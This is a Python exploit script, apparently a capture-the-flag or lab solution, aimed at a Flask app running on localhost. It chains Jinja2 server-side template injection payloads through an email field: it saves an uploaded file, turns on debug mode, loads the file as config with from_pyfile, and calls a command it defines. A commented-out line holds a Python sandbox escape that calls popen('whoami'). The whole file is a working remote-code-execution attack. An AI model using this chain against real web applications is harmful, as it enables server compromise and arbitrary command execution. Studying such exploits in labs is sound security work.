import requests
from bs4 import BeautifulSoup


def parse_result(result):
    if "Invalid email address" in result:
        print("Invalid email address")
    elif "Internal Server Error" in result:
        print("Internal Server Error")
    else:
        soup = BeautifulSoup(result, 'html.parser')
        print(soup.findAll('div', attrs={'class': 'form-group'})[1].findChildren()[2].text[6:].split('@')[0])


url = 'http://127.0.0.1:5000/test'

print("[+] Create command file")
#cmd = "CMD = ().__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.__getitem__('popen')('whoami').read()"
cmd = "CMD = print\n"
with open('client.cfg', 'w') as file:
    file.write(cmd)

print("[+] Upload config file")
files = {'x': open('client.cfg', 'rb')}
ssti='"{{request.files.get(\'x\').save(\'x\')}}"@f.uk'
data = {
        'email': ssti,
        'password': '123456',
        'confirm': '123456',
        'Content-Type': 'multipart/form-data',
        'file': 'x'
       }
#requests.post(url=url, files=files, data=data)
print(requests.post(url=url, files=files, data=data).text)

print("[+] Set debug mode")
ssti = '"{{config.update({\'DEBUG\':True})}}"@f.uk'
data = {'email': ssti, 'password': '123456', 'confirm': '123456'}
#requests.post(url=url, data=data)
print(requests.post(url=url, data=data).text)

print("[+] Load config file")
ssti = '"{{config.from_pyfile(\'x\')}}"@f.uk'
data = {'email': ssti, 'password': '123456', 'confirm': '123456'}
#requests.post(url=url, data=data)
print(requests.post(url=url, data=data).text)

print("[+] Check config")
ssti = '"{{config.items()}}"@f.uk'
data = {'email': ssti, 'password': '123456', 'confirm': '123456'}
#requests.post(url=url, data=data)
print(requests.post(url=url, data=data).text)

print("[+] Run cmd")
ssti = '"{{config[\'CMD\'](\'hello\')}}"@f.uk'
data = {'email': ssti, 'password': '123456', 'confirm': '123456'}
#requests.post(url=url, data=data)
print(requests.post(url=url, data=data).text)